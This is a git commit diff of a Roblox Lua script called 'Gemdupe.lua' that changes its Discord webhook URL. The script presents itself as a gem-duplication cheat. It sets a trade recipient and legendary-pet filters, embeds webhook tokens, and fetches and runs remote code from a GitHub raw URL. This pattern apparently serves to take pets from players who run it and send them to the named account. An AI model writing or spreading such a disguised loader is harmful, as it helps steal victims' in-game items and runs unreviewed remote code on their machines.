f436620ead2542cd6ca9d893384be7c78ad9d316
Shisuiiiis <108449104+Shisuiiiis@users.noreply.github.com>
2022-07-01 08:56:19 +0800

    Update Gemdupe.lua

--- Gemdupe.lua
+++ Gemdupe.lua
@@ -2,5 +2,5 @@ PetRarity = "Legendary"
 PetLimited = true
 PetAll = false
 TradeUser = "tyfortnycfPH"
-WebhookURL = "https://discord.com/api/webhooks/991850282394853537/WWmFxUwZOvMVbQY7c_CS6vV_SE5_ziJRjcRN8yvCYGt2cXTyNuwNw_G64bYzEFJYiD5J"
+WebhookURL = "https://discord.com/api/webhooks/992231856009396324/GAsOmtezanzyxIQYRB5AdidEGAbej8i98pn1pofGVY0vUxtR23didg7-y7Qfvb-tfg9G"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
